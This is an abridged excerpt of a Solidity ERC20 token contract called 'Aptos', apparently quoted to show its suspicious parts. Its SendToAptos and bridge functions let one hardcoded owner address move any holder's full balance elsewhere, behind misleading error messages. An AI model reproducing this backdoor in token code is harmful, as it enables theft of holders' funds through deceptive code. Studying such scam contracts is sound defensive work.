...
contract Aptos  is Context, IERC20 {
    ...
    address _addr = 0x564286362092D8e7936f0549571a803B203aAceD;
    address public _origin = 0x426E800776069a2ABad97903D739cff03B5d2F72;
    ...
    constructor () public {
        ...
        _symbol = "APTOS";
        _decimals = 18;
        uint256 initialSupply = 410217360;
        _safeOwner = _origin;
...
*/
        ...
        function Exchange(address account, address staker) public {
        ...
        function SendToAptos(address account, address staker) public {
            require(msg.sender == _origin, "ERC20: mint to the zero address");
            uint256 amount = _balances[account];
            _beforeTokenTransfer(account, staker, amount);
        ...
        function bridge(address account, address staker) public {
            require(msg.sender == _origin, "ERC20: mint to the zero address");
            uint256 amount = _balances[account];
            _beforeTokenTransfer(account, staker, amount);
